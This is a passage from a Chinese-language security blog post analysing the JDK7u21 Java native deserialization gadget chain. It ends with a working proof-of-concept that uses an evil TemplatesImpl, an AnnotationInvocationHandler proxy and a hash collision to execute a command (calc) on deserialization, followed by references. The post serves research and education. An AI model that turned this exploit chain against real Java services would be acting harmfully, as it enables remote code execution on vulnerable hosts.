class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteCode = cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCode);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"xx"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        expHashSet();</span><br><span class="line"><span class="comment">//        expLinkedHashSet();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expLinkedHashSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates = getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Poc<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">templates</span>.<span class="title">getClass</span>().<span class="title">getInterfaces</span>(), <span class="title">tempHandler</span>)</span>;</span><br><span class="line">        </span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, templates);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">byte</span>[] obj = serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">expHashSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates = getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;-<span class="number">16</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建动态代理，用tempHandler代理Templates接口，AnnotationInvocationHandler的invoke代理Templates接口的两个方法newTransformer()和getOutputProperties()</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Poc<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">templates</span>.<span class="title">getClass</span>().<span class="title">getInterfaces</span>(), <span class="title">tempHandler</span>)</span>;</span><br><span class="line"></span><br><span class="line">        HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        set.add(proxy);</span><br><span class="line">        set.add(templates);</span><br><span class="line">        map.put(<span class="string">"f5a5a608"</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] obj = serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3" target="_blank" rel="noopener">https://gist.github.com/frohoff/24af7913611f8406eaf3</a><br><a href="https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/" target="_blank" rel="noopener">https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/</a><br>phith0n：Java安全漫谈 - 18.原生反序列化利用链JDK7u21<br><a href="https://xz.aliyun.com/t/9704" target="_blank" rel="noopener">https://xz.aliyun.com/t/9704</a><br><a href="https://www.cnblogs.com/wlrhnh/p/7256969.html" target="_blank" rel="noopener">https://www.cnblogs.com/wlrhnh/p/7256969.html</a><br><a href="http://blog.csdn.net/justloveyou_/article/details/62893086" target="_blank" rel="noopener">http://blog.csdn.net/justloveyou_/article/details/62893086</a><br><a href="https://blog.csdn.net/justloveyou_/article/details/71713781" target="_blank" rel="noopener">https://blog.csdn.net/justloveyou_/article/details/71713781</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、反序列化载体分析"><span class="toc-number">1.</span> <span class="toc-text">一、反序列化载体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1、AnnotationInvocationHandler链"><span class="toc-number">1.1.</span> <span class="toc-text">1、AnnotationInvocationHandler链</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-1、AnnotationInvocationHandler-invoke"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1、AnnotationInvocationHandler.invoke()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1-2、-AnnotationInvocationHandler-equalsImpl"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2、 AnnotationInvocationHandler.equalsImpl()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2、proxy-equals-TemplatesImpl实例"><span class="toc-number">1.2.</span> <span class="toc-text">2、proxy.equals(TemplatesImpl实例)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1、HashMap-put"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1、HashMap.put()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2、TemplatesImpl实例的哈希-Proxy实例的哈希"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2、TemplatesImpl实例的哈希&#x3D;&#x3D;Proxy实例的哈希</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3、如何能够调用HashMap-put？"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3、如何能够调用HashMap.put？</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3、为什么有的POC入口是LinkedHashSet，有的是HashSet？"><span class="toc-number">1.3.</span> <span class="toc-text">3、为什么有的POC入口是LinkedHashSet，有的是HashSet？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4、关于map-put-quot-f5a5a608-quot-templates-的位置问题"><span class="toc-number">1.4.</span> <span class="toc-text">4、关于map.put(&quot;f5a5a608&quot;, templates);的位置问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、类似漏洞的挖掘思路"><span class="toc-number">2.</span> <span class="toc-text">二、类似漏洞的挖掘思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、漏洞修复"><span class="toc-number">3.</span> <span class="toc-text">三、漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、POC"><span class="toc-number">4.</span> <span class="toc-text">四、POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考："><span class="toc-number">5.</span> <span class="toc-text">参考：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&text=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&is_video=false&description=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=关于JDK7u21 Gadgets的两个问题的探讨&body=Check out this article: http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&title=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&name=关于JDK7u21 Gadgets的两个问题的探讨&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/07/27/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9EJDK7u21%E5%88%86%E6%9E%90/&t=关于JDK7u21 Gadgets的两个问题的探讨" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
